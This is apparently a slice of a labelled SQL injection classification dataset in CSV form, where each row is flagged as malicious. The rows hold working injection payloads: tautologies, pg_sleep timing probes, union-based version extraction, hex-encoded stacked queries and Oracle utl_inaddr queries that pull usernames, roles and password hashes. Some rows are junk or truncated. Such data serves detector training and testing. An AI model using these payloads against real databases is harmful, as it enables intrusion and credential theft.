row_index,payload_norm,label,sqli_type_hint
600,or pg_sleep ( __TIME__ ) --,1,
601,or '1' = '1'--,1,
602,"select * from users where id = 1 or 1#""1 union select 'a',version ( ) -- 1",1,
603,"select * from users where id = 1 or 1#"". = 1 union select 1,version ( ) -- 1",1,
604,"select * from users where id = 1 or @#""{ = 1 union select 1,version ( ) -- 1",1,
605,AND 1 = utl_inaddr.get_host_address ( ( SELECT COUNT ( DISTINCT ( USERNAME ) ) FROM SYS.ALL_USERS ) ) AND 'i' = 'i,1,
606,sqlvuln,1,
607,"select * from users where id = 1 or "".{"" or 1 = 1 -- 1",1,
608,"select * from users where id = 1 or 1#""; union select 'a',version ( ) -- 1",1,
609,0x730065006c0065006300740020004000400076006500 ...,1,
610,"select * from users where id = 1 union select 1 1$,version ( ) -- 1",1,
611,"select * from users where id = 1. <@ union select version ( ) ,version ( ) -- 1",1,
612,declare @s varchar ( 8000 ) select @s = 0x73656c65637420404076657273696f6e,1,
613,select * from users where id = '1' or \<$ or 1 = 1 -- 1',1,
614,or ''&',1,
615,"select * from users where id = 1 or ""?_"" or 1 = 1 -- 1",1,
616,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 6 ) ) AND 'i' = 'i",1,
617,"select * from users where id = '1' union select \.%1,@@VERSION -- 1'",1,
618,"select * from users where id = 1 or 1#""$ union select version ( ) ,version ( ) -- 1",1,
619,or 'something' = 'some'+'thing',1,
620,#NAME?,1,
621,declare @q nvarchar ( 4000 ) select @q =,1,
622,"select * from users where id = 1.&&@ union select 1,version ( ) -- 1",1,
623,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 2 ) ) AND 'i' = 'i",1,
624,"select * from users where id = 1 or ""@ ( "" or 1 = 1 -- 1",1,
625,"select * from users where id = 1 + @<@# union select null,version ( ) -- 1",1,
626,"select * from users where id = 1 or "" ( 1"" or 1 = 1 -- 1",1,
627,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 1 ) ) AND 'i' = 'i",1,
628,"select * from users where id = 1 +1<@ union select version ( ) ,version ( ) -- 1",1,
629,"select * from users where id = 1 union select 1a,banner from v$version where rownum = 1 -- 1",1,
